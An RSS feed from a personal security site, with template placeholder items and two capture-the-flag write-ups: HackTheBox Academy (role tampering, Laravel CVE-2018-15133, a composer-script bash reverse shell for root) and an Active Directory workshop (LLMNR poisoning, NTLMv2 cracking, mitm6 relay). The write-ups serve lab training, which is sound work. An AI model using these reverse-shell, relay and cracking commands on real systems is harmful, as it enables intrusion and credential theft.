<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Mohamed ELLEUCH</title>
    <link>https://mohamed-elleuch.me/</link>
      <atom:link href="https://mohamed-elleuch.me/index.xml" rel="self" type="application/rss+xml" />
    <description>Mohamed ELLEUCH</description>
    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 01 Jun 2030 13:00:00 +0000</lastBuildDate>
    <image>
      <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
      <title>Mohamed ELLEUCH</title>
      <link>https://mohamed-elleuch.me/</link>
    </image>
    
    <item>
      <title>Example Talk</title>
      <link>https://mohamed-elleuch.me/talk/example-talk/</link>
      <pubDate>Sat, 01 Jun 2030 13:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/talk/example-talk/</guid>
      <description>&lt;div class=&#34;alert alert-note&#34;&gt;
  &lt;div&gt;
    Click on the &lt;strong&gt;Slides&lt;/strong&gt; button above to view the built-in slides feature.
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Slides can be added in a few ways:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Create&lt;/strong&gt; slides using Wowchemy&amp;rsquo;s &lt;a href=&#34;https://wowchemy.com/docs/managing-content/#create-slides&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;Slides&lt;/em&gt;&lt;/a&gt; feature and link using &lt;code&gt;slides&lt;/code&gt; parameter in the front matter of the talk file&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Upload&lt;/strong&gt; an existing slide deck to &lt;code&gt;static/&lt;/code&gt; and link using &lt;code&gt;url_slides&lt;/code&gt; parameter in the front matter of the talk file&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Embed&lt;/strong&gt; your slides (e.g. Google Slides) or presentation video on this page using &lt;a href=&#34;https://wowchemy.com/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;shortcodes&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Further event details, including &lt;a href=&#34;https://wowchemy.com/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;page elements&lt;/a&gt; such as image galleries, can be added to the body of this page.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Academy Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-academy/</link>
      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-academy/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nmap.png&#34;&gt;
As we see we have 2 ports open &lt;br/&gt;
SSH on port 22 running OpenSSH 8.2p1 &lt;br/&gt;
http on port 80 running httpd 2.4.41 &lt;br/&gt;
&lt;p&gt;we notice as well the academy.htb domain, which we should add to /etc/hosts.&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreengobuster-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Gobuster scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;gob.png&#34;&gt;
&lt;h1 id=&#34;p-stylecolorredinitial-footholdp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial Foothold&lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreenidentifying-the-exploitp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Identifying the exploit&lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;So basically the first thing that tried was sql injection on &lt;b&gt; admin.php &lt;/b&gt; but that didn&amp;rsquo;t give me any results. as we don&amp;rsquo;t have any potential users let&amp;rsquo;s move on and dig further. &lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s create an account and see if we can find any usernames and intercept it with burp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o
Connection: close
uid=elleuch&amp;amp;password=elleuch&amp;amp;confirm=elleuch&amp;amp;roleid=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can notice the &lt;b&gt;roleid&lt;/b&gt;	parameter which is set to 0. we can assume that&amp;rsquo;s assigning a role to the user we&amp;rsquo;re creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s change change 0 to 1 and forward the request and create our privileged user and try to login to &lt;b&gt;/admin.php&lt;/b&gt;&lt;/p&gt;
&lt;img src=&#34;planner.png&#34;&gt;
&lt;p&gt;As we see above the planner leaks to us a subdomain &lt;b&gt;dev-staging-01.academy.htb&lt;/b&gt; &lt;br/&gt;
Let&amp;rsquo;s add it to /etc/hosts and see what we get&lt;/p&gt;
&lt;img src=&#34;laravel.png&#34;&gt;
&lt;p&gt;Errors! That sounds promosing! Scrolling down we can see something really interesting&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;APP_KEY	 &amp;quot;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have the APP_KEY! We can abuse &lt;b&gt;Laravel Unserialize Vulnerability CVE-2018-15133 &lt;/b&gt; &lt;br/&gt;
For this exploit we&amp;rsquo;ll be using this script, a pretty easy syntax.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And voilà we&amp;rsquo;re on the box&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorreduser-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Now let&amp;rsquo;s start enumarating,We already know that the webserver is running PHP Laravel. &lt;/br&gt;
The first thing we should look at is the &lt;b&gt;.env&lt;/b&gt; file. &lt;/br&gt;
&lt;img src=&#34;env.png&#34;&gt;
And we get a password! &lt;br /&gt;
&lt;code&gt;mySup3rP4s5w0rd!!&lt;/code&gt; &lt;br/&gt;
Let&amp;rsquo;s see if it belongs to any existing user
&lt;img src=&#34;users.png&#34;&gt;
After manually trying to switch to these users, it turns out to be cry0l1t3&amp;rsquo;s password
&lt;img src=&#34;logincry.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Our user is in the &lt;b&gt;adm&lt;/b&gt; group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it&lt;/p&gt;
&lt;img src=&#34;mrb3.png&#34;&gt;
&lt;p&gt;&lt;code&gt;data=6D7262336E5F41634064336D79210A&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Seems we got a password! But it&amp;rsquo;s hex encoded! Let&amp;rsquo;s decode it&lt;/p&gt;
&lt;img src=&#34;pw.png&#34;&gt;
&lt;p&gt;&lt;code&gt;mrb3n_Ac@d3my!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Seems like it&amp;rsquo;s mrb3n&amp;rsquo;s password!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Mrb3n can execute &lt;b&gt;/usr/bin/composer&lt;/b&gt; as root!&lt;/p&gt;
&lt;img src=&#34;sudo.png&#34;&gt;
&lt;p&gt;Going through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{ 
&amp;quot;scripts&amp;quot;:{&amp;quot;shell&amp;quot;:&amp;quot;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.111/4444 0&amp;gt;&amp;amp;1&#39;&amp;quot;}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We set our listener&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvnp 4444 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And execute&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo /usr/bin/composer --working-dir=fake run-script shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;root.png&#34; &gt;&lt;/p&gt;
&lt;p&gt;And we rooted the box! &lt;br/&gt;
&lt;code&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackLock Active Directory Workshop Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/hacklockad/</link>
      <pubDate>Tue, 23 Mar 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/hacklockad/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredoverview-of-the-network-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Overview of the network &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;archi.png
&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredtask-llmnr-poisoning-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;TASK: LLMNR poisoning &lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreenintercepting-the-user-hash-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Intercepting the user hash &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;We start by getting the network interface name&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo ifconfig
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220182306.png
&#34; /&gt;
We&amp;rsquo;re going to use the responder package which comes preinstalled in kali linux.
So basically we&amp;rsquo;re going to provide our network interface to responder , and let him do its magic&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo responder -I eth0 -rdwv 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And we wait until a user accidentally make a mistake while writing his hostname instead of providing a legitimate hostname in the DNS.
And get his NTLMv2 hash.&lt;/p&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220183501.png&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Username:naruto
Hash: naruto:::0099db0783fde
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;p-stylecolorgreencracking-the-hash-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Cracking the HASH &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;re going to use hashcat and rockyou wordlist to crack this hash,Basically we just need the Hash-Mod
First of all, we&amp;rsquo;re going to look for NTLMv2 Hash-Mod&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184300.png&#34; /&gt;
Finally run hashcat,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hashcat.exe -m 5600 hash.txt rockyou.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184655.png&#34; /&gt;
And we wait until hashcat cracks it&lt;/p&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184750.png&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
NARUTO:::bb5943c5efa0d0b9:b8a5d31bab00af7d8d013d1d7142dbdf:0101000000000000c0653150de09d201542d404b9a268f50000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b1eab93d8abdc394076eb8f8ca0ccf66489376bd473809472a94f666423ea3c20a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0030002e0036000000000000000000:kelvinP@ssw0rd 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;p-stylecolorgreenflagp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;FLAG&lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Securinets{kelvinP@ssw0rd}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;p-stylecolorredtask-ipv6-attack-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Task: IPv6 Attack &lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreenpreparing-for-the-attack--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Preparing for the Attack  &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;re going to start with gathering informations about the network&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo ifconfig
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220182306.png&#34; /&gt;
&lt;code&gt;Network address: 10.0.0.0/24&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s now find the hosts IPs, It may take a while&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap 10.0.0.0/24 -Pn | grep 10.0.0 | awk &#39;{print $6}&#39; | uniq &amp;gt; ips.txt 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now let&amp;rsquo;s an nmap scan on the result&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo nmap -sV -n -v -Pn -p- T4 -iL ips.txt -A --open -oA nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Or you can directly&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV -p- T4 10.0.0.0/24 -oA nmap 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220195053.png&#34; /&gt;
&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220195212.png&#34; /&gt;
After viewing the nmap results we can see that 10.0.0.7 is ip of the domain controller&lt;/p&gt;
&lt;p&gt;We can get the domain name either from the nmap results or by enumerating the ldap&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ldapsearch -h 10.0.0.7 -x -s base namingcontexts
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220194446.png&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;namingcontexts: DC=SECURINETS,DC=local
// SECURINETS.local is the domain name
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;p-stylecolorgreenattacking--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Attacking  &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;So basically we&amp;rsquo;re going to  acts as an IPv6 router responsding to configuration request from the machine and assign it with an IPv6 address and an IPv6 DNS server. We going to use mitm6 ( &lt;a href=&#34;https://github.com/fox-it/mitm6&#34;&gt;https://github.com/fox-it/mitm6&lt;/a&gt; ) which will act as IPv6 Router during the attack  and ntlmrelayx  ( Comes preinstalled in kali ) to capture the credentials and relay them to target machine.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s start by setting up mitm6&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo mitm6 -d SECURINETS.local
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s now set up our ntlm relay&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo impacket-ntlmrelayx -6 -t ldaps://10.0.0.7 -wh pwned.SECURINETS.local -l l00t
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200338.png&#34; /&gt;
And wait until we get something juicy&lt;/p&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200440.png&#34; /&gt;
A folder l00t has been created which contains informations about the AD&lt;/p&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200621.png&#34; /&gt;&lt;/p&gt;
&lt;p&gt;And we grab our flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cat * | grep Securinets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220201212.png&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreen-flag--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt; Flag  &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Securinets{U_D1d_W3ll_S0lv1ng_Th1s_AD_Master}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>Slides</title>
      <link>https://mohamed-elleuch.me/slides/example/</link>
      <pubDate>Tue, 05 Feb 2019 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/slides/example/</guid>
      <description>&lt;h1 id=&#34;create-slides-in-markdown-with-wowchemy&#34;&gt;Create slides in Markdown with Wowchemy&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://wowchemy.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Wowchemy&lt;/a&gt; | &lt;a href=&#34;https://owchemy.com/docs/managing-content/#create-slides&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Documentation&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;features&#34;&gt;Features&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Efficiently write slides in Markdown&lt;/li&gt;
&lt;li&gt;3-in-1: Create, Present, and Publish your slides&lt;/li&gt;
&lt;li&gt;Supports speaker notes&lt;/li&gt;
&lt;li&gt;Mobile friendly slides&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;controls&#34;&gt;Controls&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Next: &lt;code&gt;Right Arrow&lt;/code&gt; or &lt;code&gt;Space&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Previous: &lt;code&gt;Left Arrow&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start: &lt;code&gt;Home&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Finish: &lt;code&gt;End&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Overview: &lt;code&gt;Esc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Speaker notes: &lt;code&gt;S&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Fullscreen: &lt;code&gt;F&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Zoom: &lt;code&gt;Alt + Click&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hakimel/reveal.js#pdf-export&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PDF Export&lt;/a&gt;: &lt;code&gt;E&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;code-highlighting&#34;&gt;Code Highlighting&lt;/h2&gt;
&lt;p&gt;Inline code: &lt;code&gt;variable&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Code block:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;porridge = &amp;quot;blueberry&amp;quot;
if porridge == &amp;quot;blueberry&amp;quot;:
    print(&amp;quot;Eating...&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h2 id=&#34;math&#34;&gt;Math&lt;/h2&gt;
&lt;p&gt;In-line math: $x + y = z$&lt;/p&gt;
&lt;p&gt;Block math:&lt;/p&gt;
&lt;p&gt;$$
f\left( x \right) = ;\frac{{2\left( {x + 4} \right)\left( {x - 4} \right)}}{{\left( {x + 4} \right)\left( {x + 1} \right)}}
$$&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;fragments&#34;&gt;Fragments&lt;/h2&gt;
&lt;p&gt;Make content appear incrementally&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{{% fragment %}} One {{% /fragment %}}
{{% fragment %}} **Two** {{% /fragment %}}
{{% fragment %}} Three {{% /fragment %}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Press &lt;code&gt;Space&lt;/code&gt; to play!&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;fragment &#34; &gt;
One
&lt;/span&gt;
&lt;span class=&#34;fragment &#34; &gt;
&lt;strong&gt;Two&lt;/strong&gt;
&lt;/span&gt;
&lt;span class=&#34;fragment &#34; &gt;
Three
&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;A fragment can accept two optional parameters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;class&lt;/code&gt;: use a custom style (requires definition in custom CSS)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;weight&lt;/code&gt;: sets the order in which a fragment appears&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;speaker-notes&#34;&gt;Speaker Notes&lt;/h2&gt;
&lt;p&gt;Add speaker notes to your presentation&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-markdown&#34;&gt;{{% speaker_note %}}
- Only the speaker can read these notes
- Press `S` key to view
{{% /speaker_note %}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Press the &lt;code&gt;S&lt;/code&gt; key to view the speaker notes!&lt;/p&gt;
&lt;aside class=&#34;notes&#34;&gt;
  &lt;ul&gt;
&lt;li&gt;Only the speaker can read these notes&lt;/li&gt;
&lt;li&gt;Press &lt;code&gt;S&lt;/code&gt; key to view&lt;/li&gt;
&lt;/ul&gt;

&lt;/aside&gt;
&lt;hr&gt;
&lt;h2 id=&#34;themes&#34;&gt;Themes&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;black: Black background, white text, blue links (default)&lt;/li&gt;
&lt;li&gt;white: White background, black text, blue links&lt;/li&gt;
&lt;li&gt;league: Gray background, white text, blue links&lt;/li&gt;
&lt;li&gt;beige: Beige background, dark text, brown links&lt;/li&gt;
&lt;li&gt;sky: Blue background, thin dark text, blue links&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;night: Black background, thick white text, orange links&lt;/li&gt;
&lt;li&gt;serif: Cappuccino background, gray text, brown links&lt;/li&gt;
&lt;li&gt;simple: White background, black text, blue links&lt;/li&gt;
&lt;li&gt;solarized: Cream-colored background, dark green text, blue links&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;

&lt;section data-noprocess data-shortcode-slide
  
      
      data-background-image=&#34;/media/boards.jpg&#34;
  &gt;

&lt;h2 id=&#34;custom-slide&#34;&gt;Custom Slide&lt;/h2&gt;
&lt;p&gt;Customize the slide style and background&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-markdown&#34;&gt;{{&amp;lt; slide background-image=&amp;quot;/media/boards.jpg&amp;quot; &amp;gt;}}
{{&amp;lt; slide background-color=&amp;quot;#0000FF&amp;quot; &amp;gt;}}
{{&amp;lt; slide class=&amp;quot;my-style&amp;quot; &amp;gt;}}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h2 id=&#34;custom-css-example&#34;&gt;Custom CSS Example&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s make headers navy colored.&lt;/p&gt;
&lt;p&gt;Create &lt;code&gt;assets/css/reveal_custom.css&lt;/code&gt; with:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;.reveal section h1,
.reveal section h2,
.reveal section h3 {
  color: navy;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h1 id=&#34;questions&#34;&gt;Questions?&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/wowchemy/wowchemy-hugo-modules/discussions&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Ask&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wowchemy.com/docs/managing-content/#create-slides&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Documentation&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>An example conference paper</title>
      <link>https://mohamed-elleuch.me/publication/example/</link>
      <pubDate>Mon, 01 Jul 2013 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/publication/example/</guid>
      <description>&lt;div class=&#34;alert alert-note&#34;&gt;
  &lt;div&gt;
    Click the &lt;em&gt;Cite&lt;/em&gt; button above to demo the feature to enable visitors to import publication metadata into their reference management software.
  &lt;/div&gt;
&lt;/div&gt;
&lt;div class=&#34;alert alert-note&#34;&gt;
  &lt;div&gt;
    Create your slides in Markdown - click the &lt;em&gt;Slides&lt;/em&gt; button to check out the example.
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Supplementary notes can be added here, including &lt;a href=&#34;https://wowchemy.com/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;code, math, and images&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title></title>
      <link>https://mohamed-elleuch.me/admin/config.yml</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/admin/config.yml</guid>
      <description></description>
    </item>
    
  </channel>
</rss>
